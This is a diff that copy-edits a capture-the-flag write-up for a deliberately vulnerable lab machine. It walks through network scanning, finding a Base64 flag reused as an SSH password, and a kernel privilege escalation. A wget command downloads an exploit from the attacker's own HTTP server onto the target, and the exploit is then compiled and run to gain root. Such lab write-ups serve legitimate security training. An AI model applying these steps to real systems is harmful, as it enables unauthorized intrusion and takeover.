@@ -13,7 +13,7 @@ Capture all 3 flags and gain root access.
 :::
 
 ## Host Discovery
-First we will find our own IP address and see what subnet we are on. Then we can scan for the IP Address of the target machine.
+First, we will find our own IP address to determine the subnet we are on. Then, we will scan for the IP address of the target machine.
 
 ```sh {3}
 # ifconfig -a
@@ -27,9 +27,9 @@ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-From this we can gather that our own IP is **10.0.2.4** and our netmask is **255.255.255.0**.
+From this, we can determine that our own IP address is **10.0.2.4** and our netmask is **255.255.255.0**.
 
-To find the IP Address of the target we will run the `netdiscover -r 10.0.2.0/24` command to view all connected devices on the network/subnet.
+To find the IP address of the target, we will run the `netdiscover -r 10.0.2.0/24` command to view all connected devices on the network or subnet.
 
 ```sh {10}
  Currently scanning: Finished!   |   Screen View: Unique Hosts              
@@ -48,9 +48,9 @@ Now we know that our target machine's IP Address is **__10.0.2.5__**.
 
 ## Aggressive Nmap Scan
 
-To learn more about what ports are open and what services are running on the target we will run an aggressive Nmap scan using the target's IP Address that we just gathered.
+To learn more about the open ports and services running on the target, we will perform an aggressive Nmap scan using the target's IP address that we just gathered.
 
-To accomplish this we will utilize [NmapAutomator](https://github.com/21y4d/nmapAutomator) and run the following command: `./nmapAutomator.sh -H 10.0.2.5 -t All`
+To accomplish this, we will utilize [NmapAutomator](https://github.com/21y4d/nmapAutomator) and run the following command: `./nmapAutomator.sh -H 10.0.2.5 -t All`
 
 ```sh {13,14}
 $ ./nmapAutomator.sh -H 10.0.2.5 -t All     
@@ -86,11 +86,11 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-From this scan we can see that ports 22 and 80 are open and they are running **ssh** and **http** respectively.
+From this scan, we can see that ports 22 and 80 are open, running **SSH** and **HTTP**, respectively.
 
 ## Web App Enumeration
 
-Since we now know that port 80 is open and running the http service we will attempt to dig a bit deeper and see what kind of information/vulnerabilities we can find.
+Since we now know that port 80 is open and running the HTTP service, we will attempt to dig deeper and identify any information or vulnerabilities we can uncover.
 
 ### Inspecting the Web Page
 
@@ -147,9 +147,9 @@ END_TIME: Tue Jan  7 17:47:05 2025
 DOWNLOADED: 4612 - FOUND: 7
 ```
 
-Based on the output we can then start to investigate all of the subdirectories and files listed. In this case, the **robots.txt** file is catching my attention.
+Based on the output, we can begin investigating all the subdirectories and files listed. In this case, the **robots.txt** file catches my attention.
 
-If we load that file in the browser we can see a string of text that appears to be encoded in Base64.
+When we load that file in the browser, we see a string of text that appears to be encoded in Base64.
 
 ![Cybersploit Website](robots.png "10.0.2.5:80/robots")
 
@@ -163,7 +163,7 @@ Flag1: cybersploit{youtube.com/c/cybersploit}
 
 ## SSH Access
 
-Using the username we found from inspecting the webpage source and the flag we just found as the password we can now attempt to login to the target via ssh.
+Using the username we found by inspecting the webpage source and the flag we just discovered as the password, we can now attempt to log in to the target via **SSH**.
 
 ```
 $ ssh itsskv@10.0.2.5                                                                                
@@ -217,7 +217,7 @@ The text is encoded via binary and if we use a binary to text converter we can r
 
 ## Privilege Escalation
 
-We need to find a way to run a exploit on this machine. We can start by finding the exact version of linux that this machine is running. To do this we will run the `uname -a` command while still logged in as **itsskv** via ssh.
+We need to find a way to run an exploit on this machine so that we can gain root access. We can start by identifying the exact version of Linux that this machine is running. To do this, we will run the `uname -a` command while still logged in as **itsskv** via **SSH**.
 
 ```
 itsskv@cybersploit-CTF:~$ uname -a
@@ -252,7 +252,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
 #### Downloading Exploit on Target Machine
 
-Now to download the exploit on the target machine we will run `wget http://10.0.2.4:8080/37292.c` via the ssh session we opened earlier.
+To download the exploit on the target machine we will run `wget http://10.0.2.4:8080/37292.c` via the ssh session we opened earlier.
 
 ```sh
 $ wget http://10.0.2.4:8080/37292.c
@@ -273,7 +273,7 @@ To compile the exploit we will simply run `gcc 37292.c` in the ssh session.
 
 ### Running the Exploit
 
-To run the exploit we need to input `./a.out` and then press ENTER. Then we can run the `whoami` command to see if the exploit worked and granted us root access to the target machine.
+To run the exploit we need to input `./a.out` and then press <kbd>ENTER</kbd>. Then we can run the `whoami` command to see if the exploit worked and granted us root access to the target machine.
 
 ```sh
 itsskv@cybersploit-CTF:~$ ./a.out
@@ -289,9 +289,9 @@ root
 
 ### Getting the Final Flag
 
-By navigating to the `/root` directory and then running a `ls` command we see the final flag listed as `finalflag.txt`.
+By navigating to the **/root** directory and running the `ls` command, we see the final flag listed as **finalflag.txt**.
 
-By running `cat finalflag.txt` we can view the contents of the file and reach the end of this CTF machine!
+Running `cat finalflag.txt` allows us to view the contents of the file and reach the end of this CTF challenge.
 
 ```sh
 # cat finalflag.txt
@@ -317,7 +317,7 @@ Thanks !
 
 ## Conclusion
 
-This CTF machine is on the simpler side, but it is great practice for working with multiple scanning tools and then forcing you to do some research about vulnerabilities and choosing an exploit to gain root access.
+This CTF machine is on the simpler side, but it provides great practice for working with multiple scanning tools and requires you to research vulnerabilities and choose an exploit to gain root access.
 
 As a recap here are the tools I used:
 - [netdiscover](https://www.kali.org/tools/netdiscover/)
